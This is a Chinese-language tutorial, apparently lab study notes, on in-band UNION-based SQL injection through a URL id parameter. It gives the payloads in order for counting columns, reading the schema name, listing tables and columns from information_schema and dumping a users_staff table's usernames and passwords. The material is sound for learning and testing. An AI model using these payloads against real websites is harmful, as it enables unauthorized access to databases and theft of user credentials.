## In-Band SQLI

### 带回显的SQLI

这种类型的SQLI可以在url中进行，像一些blog，其页面中会有作者、作者id、文章内容等页面内容，这就会根据url的请求而带有回显，从而可以看得到查询结果以及判断sql语法是否有误

```
像url中的'article？id=1'实际上相当于’select * from article where id =1 limit 1;'

这时候id=1会返回正确的结果，但我们需要一个不正确的结果，并通过改写sql语句，使其返回正确的结果
便可以在url中修改为：

'article?id=0 union select 1 ;--'
这样就相当于
'select *from article where id = 0 union select 1;--limit 1;'

在sql语法中--表示后面的内容为注释，不会执行
当然一般这会返回错误结果，但我们就是得根据错误的结果来判断表有多少列
得到错误结果后，接着加上个2

'article?id=0 union select 1,2 ;--'
相当于
'select * from article where id = 0 union select 1,2;-- limit 1'
```

可能会再一次得到错误结果，这说明表不止2列，就接着往下加数字，直到不报错为止
```
'article?id=0 union select 1,2,3 ;--'
相当于
'select * from article where id = 0 union select 1,2,3;-- limit 1'
```

假设表只有3列，那么这时就不会返回错误了,会显示正常的内容

这就表明当前页面调用了数据库中的三列内容

这时我们把第三列的地方换位database()

```
'article?id =0 union select 1,2,database();--'
等于
'select * from article where id =0 union select 1,2,database();-- limit 1'
```

这时就可以在页面中调用第三列内容的地方看到该schema的名字，例如'sqli_one'

接着把url改为：
```
’article?id =0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'sqli_one';--
```

方法 group_concat（） 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。

这样就可以得到该schema下所有table的名字，例如有‘article'和'users_staff'，那么’users_staff'就是我们想要的table

接着改为：
```
articl？id =0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users_staff';--
```

便可以得到users_staff下的所有column名字了，例如有‘username’、‘password’

接着改为:
```
article?id=0 union select 1,2,group_concat(username,':',password separator '<br>') from users_staff;--
```

我们使用 group_concat 方法将所有行返回到一个字符串中，并使其更易于阅读。我们还添加了 ，'：' 以将用户名和密码分开。我们没有用逗号分隔，而是选择了 HTML <br> 标签，该标签强制每个结果位于单独的行上，以便于阅读。

这样便得到了所有的用户名和其密码






